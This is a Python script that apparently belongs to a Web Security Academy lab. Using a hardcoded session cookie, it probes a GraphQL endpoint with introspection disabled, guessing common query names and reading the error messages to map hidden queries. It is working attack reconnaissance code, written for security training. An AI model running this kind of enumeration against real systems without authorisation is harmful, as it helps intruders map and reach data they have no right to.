#!/usr/bin/env python3
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a1000fc04d4fc0eb52e0496005100d9.web-security-academy.net/api"
SESSION = "GPdO56RgzjaIq6mPvQxz7jbi758RfNkf"

headers = {"Cookie": f"session={SESSION}"}

print("[*] GraphQL endpoint found at /api (GET only)")
print("[*] Introspection is blocked\n")

# Common query names to try
common_queries = [
    "getUser",
    "getUsers",
    "user",
    "users",
    "me",
    "currentUser",
    "login",
    "getBlogPost",
    "getAllBlogPosts",
]

print("[*] Trying common query names...\n")

for query_name in common_queries:
    # Try without arguments
    query = f"{{{query_name}}}"

    response = requests.get(URL, params={"query": query}, headers=headers, verify=False)

    if response.status_code == 200:
        data = response.json()

        # Check if we got an error about missing arguments (means query exists!)
        if 'errors' in data:
            error_msg = data['errors'][0].get('message', '')

            if 'argument' in error_msg.lower() or 'field' in error_msg.lower() or 'required' in error_msg.lower():
                print(f"[+] Query '{query_name}' exists!")
                print(f"    Error: {error_msg}")
                print()
            elif 'Cannot query field' not in error_msg:
                print(f"[?] '{query_name}': {error_msg}")
        elif 'data' in data:
            print(f"[+] SUCCESS: '{query_name}' returned data!")
            print(f"    {data}")
            print()

print("\n[*] Scan complete")
